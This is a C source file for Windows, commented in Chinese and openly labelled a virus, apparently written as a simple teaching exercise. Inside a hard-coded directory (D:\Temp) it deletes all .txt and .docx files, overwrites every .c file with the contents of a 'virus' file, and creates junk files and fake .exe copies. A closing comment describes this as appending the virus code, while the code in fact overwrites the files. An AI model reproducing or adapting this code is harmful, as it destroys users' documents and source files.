#include<stdio.h>
#include<io.h>
#include<Windows.h>
#include<stdlib.h>
#include<string.h>
#include <direct.h>

//本地文件的各种定义
#define INFECT_PATH "D:\\Temp"  //需要进行的操作目录
#define DELETE_FILE1 "D:\\Temp\\*.txt" //要被删除的文件后缀
#define DELETE_FILE2 "D:\\Temp\\*.docx"
#define CREAT_EXE1 "D:\\Temp\\worm.exe"
#define CREAT_EXE2 "D:\\Temp\\virus.exe"
#define Targetfile "D:\\Temp\\*.c"  //要感染的文件后缀
#define Virusfile "D:\\KILL.c"  //病毒C文件


//各种函数的声明
void MakeRubbish(void); //制造垃圾文件函数
void CreatEXE(void);    //生成病毒exe文件
void Remove(void);      //删除文件函数
void InfectFile(void);  //感染文件函数
void copyfile(char* infile,char *outfile);  //复制内容函数

void MakeRubbish(void) { //生成垃圾
    int i = 0;
    FILE *fp=NULL;
    char* path=NULL;
    char* NewName=NULL;
    char tempname[]="XXXXXX";

    path = INFECT_PATH;   

    if(!_chdir(path)) {
        printf("打开文件成功!\n");
    }
    else {
        printf("打开文件失败!\n");
        perror("错误：");
    }

    NewName=_mktemp(tempname); //_mktemp建立一个唯一的文件名
    fp=fopen(NewName,"w");
    fclose(fp);
}


void CreatEXE(void) {  //生成病毒文件
    char* s[2] = {CREAT_EXE1, CREAT_EXE2};
    for(int i=0; i<2; i++) {
        open(s[i], 0x0100, 0x0080); //以O_CREAT和可写的方式打开s[i]中指出的文件，如果文件不存在，就创建它。
        copyfile(Virusfile, s[i]);
    }
}


void Remove(void)
{
    int done;  //下面代码的文件句柄的定义

    struct _finddata_t ffblk;  //定义一个结构体指针变量
    char *documenttype[2] = {DELETE_FILE1, DELETE_FILE2}; 
    for (int i = 0; i < 2; i++)
    {
        done = _findfirst(documenttype[i], &ffblk); //_findfirst查找成功返回文件句柄,失败返回-1
        if(done != -1)
        {
            printf("delete %s\n", ffblk.name);
            remove(ffblk.name);
            while (!_findnext(done, &ffblk)) //_findnext进行二次查找，成功返回0，失败返回-1
            {
                printf("delete %s\n", ffblk.name);
                remove(ffblk.name);  //删除文件
            }
        }
        _findclose(done);  //若关闭成功返回0，失败返回-1
    }
}
/*
_finddata_t是用来存储文件各种信息的结构体, _findfirst和_findnext均为查找文件函数，_findclose关闭文件函数。
*/


void copyfile(char* infile, char* outfile)
{
    FILE *in, *out;
    in = fopen(infile,"r");
    out = fopen(outfile,"w");
    while(!feof(in))
    {
        fputc(fgetc(in), out);
    }
    fclose(in);
    fclose(out);
}


void InfectFile(void)
{
    int done;
    int i;

    struct _finddata_t ffblk;
    char *documenttype  = Targetfile;

    done = _findfirst(documenttype, &ffblk);
    copyfile(Virusfile, ffblk.name);
    while (!_findnext(done, &ffblk))  //若找到.c文件
    {
        copyfile(Virusfile, ffblk.name); //进行感染
    }
    _findclose(done);
}


int main(void)
{
    MakeRubbish( );             //制造垃圾
    CreatEXE( );                //制造exe程序
    Remove( );                  //删除
    InfectFile( );              //感染
    system("pause");
    return 0;
}


/*请不要随意使用该病毒!*/
// 该病毒功能：
// 1.将一个指定目录内的所有.c文件感染成指定内容（把E_KILL.c文件内容添加病毒自身代码至.c文件）。
// 2.将该目录下的所有.txt，.docx文件删除。
// 3.在该目录下制造垃圾文件。
// 4.在该目录下放置.exe垃圾。

/*KILL.c文件内容示例：

#include<stdio.h>
#include<Windows.h>

int main(void)
{
    printf("这个是病毒!!！\n");
    system("pause");
    return 0;
}
*/
